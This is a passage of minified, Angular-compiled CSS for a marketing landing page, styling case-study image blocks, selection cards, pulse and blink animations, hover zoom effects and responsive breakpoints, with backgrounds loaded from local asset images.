75%}50%{background-size:50% 100%,50% 80%}to{background-size:25% 75%,25% 75%}}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:100%;position:absolute;top:0;left:0;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/backtextOR.png) no-repeat 100% 30%,url(/assets/images/backtextBL.png) no-repeat 100% 100%}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:1250px}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]   .info--text--main[_ngcontent-%COMP%]{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]   .info--text--main[_ngcontent-%COMP%]   .info--title[_ngcontent-%COMP%]{width:100%;color:#646464;font-family:Raleway;font-size:42px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left;text-transform:uppercase;transition:color .3s ease-in-out}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]   .info--text--main[_ngcontent-%COMP%]   .info--title.active[_ngcontent-%COMP%]{color:#fff}@media (max-width: 768px){.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]   .info--text--main[_ngcontent-%COMP%]{padding:10px}.wrapper--info--text--section[_ngcontent-%COMP%]   .wrapper--info--text[_ngcontent-%COMP%]   .info--text--main[_ngcontent-%COMP%]   .info--title[_ngcontent-%COMP%]{font-size:24px!important}}@keyframes _ngcontent-%COMP%_pulse-circle{0%{background-size:0% 0%,65%}50%{background-size:85% 100%,65%}to{background-size:0% 0%,65%}}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]{position:relative;background:url(/assets/images/case1.png) no-repeat 68% 100%;justify-content:space-between;min-height:820px;display:flex}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:1000px;position:absolute;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/backgray.png) no-repeat 50% 30%;margin-top:-260px;margin-left:-140px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{position:relative}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{width:236px;height:469px;transition:transform .3s ease;position:absolute}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:200px;left:120px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:110px;left:360px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:0;left:600px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]{width:172px;height:123px;margin-top:100px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--title[_ngcontent-%COMP%]{color:#ff8a00;font-family:Raleway;font-size:14px;font-weight:700;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--subtitle[_ngcontent-%COMP%]{color:#fff;font-family:Raleway;font-size:42px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--1[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--description[_ngcontent-%COMP%]{color:#d9d5d5;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]{background:url(/assets/images/case2.png) no-repeat 50% 100%;background-size:auto;max-width:800px;min-height:820px;display:flex;position:relative}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:1000px;position:absolute;left:300px;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/backgray.png) no-repeat 50% 30%;margin-top:-260px!important;margin-right:0!important}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{position:relative}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{width:236px;height:469px;transition:transform .3s ease;position:absolute}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:0;left:250px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:110px;left:500px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:200px;left:750px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]{width:172px;height:123px;margin-top:100px}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--title[_ngcontent-%COMP%]{color:#ff8a00;font-family:Raleway;font-size:14px;font-weight:700;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--subtitle[_ngcontent-%COMP%]{color:#fff;font-family:Raleway;font-size:42px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--cases--section[_ngcontent-%COMP%]   .wrapper--cases[_ngcontent-%COMP%]   .cases--img--block--main[_ngcontent-%COMP%]   .cases--img--block--2[_ngcontent-%COMP%]   .cases--text[_ngcontent-%COMP%]   .cases--text--description[_ngcontent-%COMP%]{color:#d9d5d5;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}@media (max-width: 1025px){.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{min-height:100px;position:relative}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{width:180px!important;height:380px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:200px;left:100px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:110px;left:290px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:0;left:470px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{min-height:100px;position:relative}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{width:180px!important;height:380px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:200px;left:100px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:110px;left:290px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:0;left:470px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}@media (max-width: 768px){.wrapper--cases[_ngcontent-%COMP%]{margin-bottom:100px}.wrapper--info--text[_ngcontent-%COMP%]{min-height:768px!important}.cases--text[_ngcontent-%COMP%]{margin:0!important}.cases--text[_ngcontent-%COMP%]   .cases--text--title[_ngcontent-%COMP%], .cases--text[_ngcontent-%COMP%]   .cases--text--subtitle[_ngcontent-%COMP%], .cases--text[_ngcontent-%COMP%]   .cases--text--description[_ngcontent-%COMP%]{text-align:center!important}.cases--img--block--1[_ngcontent-%COMP%]{background:url(/assets/images/case3.png) no-repeat 50% 30%!important;background-size:auto!important;padding:10px;min-height:752px!important;flex-direction:column-reverse;align-items:center;margin-bottom:100px}.cases--img--block--1[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{top:200px;left:140px}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{min-height:100px;position:relative}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:119px!important;height:238px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:-370px!important;left:-150px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:-450px!important;left:-40px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:-290px!important;left:30px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}@media (max-width: 768px) and (max-width: 375px){.wrapper--cases[_ngcontent-%COMP%]{margin-bottom:100px}.wrapper--info--text[_ngcontent-%COMP%]{min-height:768px!important}.cases--text[_ngcontent-%COMP%]{margin:0!important}.cases--text[_ngcontent-%COMP%]   .cases--text--title[_ngcontent-%COMP%], .cases--text[_ngcontent-%COMP%]   .cases--text--subtitle[_ngcontent-%COMP%], .cases--text[_ngcontent-%COMP%]   .cases--text--description[_ngcontent-%COMP%]{text-align:center!important}.cases--img--block--1[_ngcontent-%COMP%]{background:url(/assets/images/case3.png) no-repeat 50% 30%!important;background-size:auto!important;padding:10px;min-height:752px!important;flex-direction:column-reverse;align-items:center;margin-bottom:100px}.cases--img--block--1[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{top:200px;left:140px}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{min-height:100px;position:relative}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:119px!important;height:238px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:-370px!important;left:-150px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:-450px!important;left:-40px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:-290px!important;left:30px!important}.cases--img--block--1[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}@media (max-width: 768px){.cases--img--block--2[_ngcontent-%COMP%]{background:url(/assets/images/case3.png) no-repeat 50% 30%!important;background-size:auto!important;min-height:752px!important;flex-direction:column;align-items:center;padding:10px}.cases--img--block--2[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{top:150px;left:0!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]{min-height:100px;position:relative}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:119px!important;height:238px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:160px!important;left:-150px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:110px!important;left:-40px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:240px!important;left:30px!important}.cases--img--block--2[_ngcontent-%COMP%]   .cases--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]{display:flex;justify-content:space-between;align-items:flex-end;min-height:284px}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]{display:flex;justify-content:space-between;width:100%;min-height:219px;padding:10px}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--leftSide[_ngcontent-%COMP%]   .selection--info--leftSide--title[_ngcontent-%COMP%]{color:#ff8a00;font-family:Raleway;font-size:14px;font-weight:700;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--leftSide[_ngcontent-%COMP%]   .selection--info--leftSide--subtitle[_ngcontent-%COMP%]{max-width:354px;min-height:100px;color:#fff;font-family:Raleway;font-size:42px;font-weight:800;line-height:120%;letter-spacing:0%;text-align:left;text-transform:uppercase}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--leftSide[_ngcontent-%COMP%]   .selection--info--leftSide--description[_ngcontent-%COMP%]{max-width:354px;min-height:16px;color:#d9d5d5;font-family:Raleway;font-size:16px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--rightSide[_ngcontent-%COMP%]{display:flex;flex-direction:column;justify-content:flex-end}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--rightSide[_ngcontent-%COMP%]   .selection--info--rightSide--title[_ngcontent-%COMP%]{color:#ff8a00;font-family:Raleway;font-size:16px;font-weight:700;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--selection--section[_ngcontent-%COMP%]   .wrapper--selection[_ngcontent-%COMP%]   .selection--info[_ngcontent-%COMP%]   .selection--info--rightSide[_ngcontent-%COMP%]   .selection--info--rightSide--description[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{color:#d9d5d5;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}@media (max-width: 768px){.selection--info[_ngcontent-%COMP%]{justify-content:space-around!important;align-items:center;flex-direction:column;min-height:331px!important}.selection--info--leftSide[_ngcontent-%COMP%]{flex-direction:column;min-height:135px!important;gap:20px;display:flex}.selection--info--leftSide--subtitle[_ngcontent-%COMP%]{font-size:24px!important;min-height:1px!important}}@keyframes _ngcontent-%COMP%_pulse{0%{background-size:100% 100%}50%{background-size:50% 50%}to{background-size:100% 100%}}.wrapper--selection--second--section[_ngcontent-%COMP%]{position:relative}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--circle--background[_ngcontent-%COMP%]{width:100%;height:100%;position:absolute;top:0;left:0;animation:_ngcontent-%COMP%_blink-Circle 4s infinite linear;background:url(/assets/images/backselection.png) no-repeat 50% 30%}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]{display:flex;flex-direction:column;justify-content:flex-end;min-height:762px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]{display:flex;justify-content:space-between;z-index:1000;padding-top:80px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]{display:flex;flex-direction:column;justify-content:space-around;width:240px;height:189px;padding:0 20px;border-radius:12px;-webkit-backdrop-filter:blur(22px);backdrop-filter:blur(22px);background:#00000026}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--img[_ngcontent-%COMP%]{display:flex;align-items:center;overflow:hidden;position:relative}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;height:auto;display:block}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){margin-right:160px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){margin-right:15px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--text[_ngcontent-%COMP%]   .selection--second--info--card--text--title[_ngcontent-%COMP%]{margin-bottom:8px;color:#fff;font-family:Poppins;font-size:26px;font-weight:600;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]   .selection--second--info--card[_ngcontent-%COMP%]   .selection--second--info--card--text[_ngcontent-%COMP%]   .selection--second--info--card--text--subtitle[_ngcontent-%COMP%]{color:#fff;font-family:Raleway;font-size:14px;font-weight:500;line-height:120%;letter-spacing:0%;text-align:left}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]{position:relative;min-height:553px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]{transition:transform .3s ease;position:absolute;width:auto;height:auto}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:-50px;left:100px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2){position:absolute;top:-60px;left:450px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(2):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3){position:absolute;top:100px;left:750px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(3):hover{transform:scale(1.1)}@media (max-width: 1200px){.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]{background-size:500px 500px}}@media (max-width: 1122px){.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]{background-size:400px 400px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info--card--main[_ngcontent-%COMP%]{justify-content:center!important;gap:20px;padding:10px;flex-wrap:wrap}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]{min-height:500px}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1){position:absolute;top:-50px;left:60px;z-index:1}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   img[_ngcontent-%COMP%]:nth-child(1):hover{transform:scale(1.1)}.wrapper--selection--second--section[_ngcontent-%COMP%]   .wrapper--selection--second[_ngcontent-%COMP%]   .selection--second--info[_ngcontent-%COMP%]   .selection--second--info--img[_ngcontent-%COMP%]   